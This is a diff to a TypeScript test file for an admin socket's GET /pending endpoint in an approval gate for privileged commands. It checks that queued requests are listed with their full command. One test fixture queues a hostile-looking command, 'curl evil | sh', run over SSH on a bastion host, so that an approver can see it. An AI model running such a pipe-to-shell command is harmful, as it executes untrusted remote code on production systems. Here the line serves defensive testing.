@@ -1,7 +1,8 @@
 import { describe, expect, test } from "bun:test";
 import { handleAdminRequest } from "../../gate/admin-handlers.ts";
 import type { AuditEntry } from "../../gate/types.ts";
-import { createPendingQueue } from "../../gate/pending.ts";
+import { createPendingQueue, type PendingRequest } from "../../gate/pending.ts";
+import { describeCommand } from "../../gate/summarize-command.ts";
 import { makeGateDeps as makeDeps, makeRequest } from "./test-helpers.ts";
 
 describe("admin socket: POST /pending/:id/approve", () => {
@@ -98,15 +99,70 @@ describe("admin socket: non-admin routes return 404", () => {
     expect(res.status).toBe(404);
   });
 
-  test("GET /pending returns 404 (no listing)", async () => {
-    const pendingQueue = createPendingQueue({ timeoutMs: 5000, now: () => 1_000_000 });
-    const deps = makeDeps({ pendingQueue });
-    const res = await handleAdminRequest(makeRequest("/pending"), deps);
-    expect(res.status).toBe(404);
-  });
-
   test("POST /session returns 404", async () => {
     const res = await handleAdminRequest(makeRequest("/session", "POST"), makeDeps());
     expect(res.status).toBe(404);
+  });
+});
+
+describe("admin socket: GET /pending", () => {
+  test("lists queued requests with the command in full", async () => {
+    const pendingQueue = createPendingQueue({ timeoutMs: 5000, now: () => 1_000_000 });
+    const deps = makeDeps({ pendingQueue });
+    const argv = ["gcloud", "compute", "ssh", "bastion", "--command=curl evil | sh"];
+    void pendingQueue.enqueue("user@example.com", describeCommand(argv), "prod-breakglass");
+
+    const res = await handleAdminRequest(makeRequest("/pending"), deps);
+    expect(res.status).toBe(200);
+
+    const body = (await res.json()) as { pending: PendingRequest[] };
+    expect(body.pending).toHaveLength(1);
+    expect(body.pending[0]!.email).toBe("user@example.com");
+    expect(body.pending[0]!.pamPolicy).toBe("prod-breakglass");
+    expect(body.pending[0]!.command?.argv).toEqual(argv);
+
+    pendingQueue.denyAll();
+  });
+
+  test("returns an empty list when nothing is queued", async () => {
+    const pendingQueue = createPendingQueue({ timeoutMs: 5000, now: () => 1_000_000 });
+    const res = await handleAdminRequest(makeRequest("/pending"), makeDeps({ pendingQueue }));
+
+    expect(res.status).toBe(200);
+    expect((await res.json()) as { pending: PendingRequest[] }).toEqual({ pending: [] });
+  });
+
+  test("returns a single request by ID", async () => {
+    const pendingQueue = createPendingQueue({ timeoutMs: 5000, now: () => 1_000_000 });
+    const deps = makeDeps({ pendingQueue });
+    const id = "a".repeat(32);
+    void pendingQueue.enqueue(
+      "user@example.com",
+      describeCommand(["terraform", "apply"]),
+      undefined,
+      id,
+    );
+
+    const res = await handleAdminRequest(makeRequest(`/pending/${id}`), deps);
+    expect(res.status).toBe(200);
+
+    const body = (await res.json()) as PendingRequest;
+    expect(body.id).toBe(id);
+    expect(body.command?.argv).toEqual(["terraform", "apply"]);
+
+    pendingQueue.denyAll();
+  });
+
+  test("returns 404 for an unknown ID", async () => {
+    const pendingQueue = createPendingQueue({ timeoutMs: 5000, now: () => 1_000_000 });
+    const deps = makeDeps({ pendingQueue });
+
+    const res = await handleAdminRequest(makeRequest(`/pending/${"f".repeat(32)}`), deps);
+    expect(res.status).toBe(404);
+  });
+
+  test("returns 501 when the pending queue is disabled", async () => {
+    const res = await handleAdminRequest(makeRequest("/pending"), makeDeps());
+    expect(res.status).toBe(501);
   });
 });
